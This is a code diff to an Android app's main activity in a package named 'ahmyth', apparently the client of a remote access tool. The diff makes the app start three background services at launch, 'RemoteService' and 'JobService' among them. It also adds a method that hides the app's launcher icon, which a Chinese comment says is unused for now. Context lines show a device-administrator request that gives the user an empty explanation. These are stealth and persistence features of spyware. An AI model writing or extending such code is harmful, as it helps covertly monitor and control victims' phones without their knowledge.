@@ -5,6 +5,7 @@ import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.os.Bundle;
 import android.view.View;
 import android.widget.Button;
@@ -12,7 +13,9 @@ import android.widget.Toast;
 
 import ahmyth.mine.king.ahmyth.R;
 import ahmyth.mine.king.ahmyth.receiver.DeviceReceiver;
+import ahmyth.mine.king.ahmyth.service.JobService;
 import ahmyth.mine.king.ahmyth.service.MainService;
+import ahmyth.mine.king.ahmyth.service.RemoteService;
 
 
 public class MainActivity extends Activity {
@@ -27,11 +30,14 @@ public class MainActivity extends Activity {
 
     public void init() {
         registerDeviceManager();
-
-        startService(new Intent(this, MainService.class));
+        startService();
     }
 
-
+    public void startService() {
+        startService(new Intent(this, MainService.class));
+        startService(new Intent(this, RemoteService.class));
+        startService(new Intent(this, JobService.class));
+    }
 
     public void registerDeviceManager() {
         DevicePolicyManager dPManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
@@ -44,6 +50,13 @@ public class MainActivity extends Activity {
             intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "");
             startActivityForResult(intent, 0);
         }
+    }
+
+    //　隐藏了启动不了，暂时不用
+    public void hideIcon() {
+        PackageManager packagemanager = getPackageManager();
+        packagemanager.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED
+            ,PackageManager.DONT_KILL_APP);
     }
 
 }
